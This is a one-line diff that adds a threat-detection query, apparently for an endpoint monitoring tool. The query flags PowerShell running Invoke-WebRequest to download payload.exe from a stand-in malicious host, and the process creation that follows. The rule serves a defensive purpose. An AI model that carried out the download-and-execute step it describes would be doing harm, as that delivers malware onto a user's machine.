@@ -1,0 +1,2 @@
+
+srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" AND Cmdline: "*Invoke-WebRequest -Uri http://malicious.com/payload.exe*" AND dstNode.Image: "C:\\Users\\User\\Downloads\\payload.exe" AND relation: "Process Create"
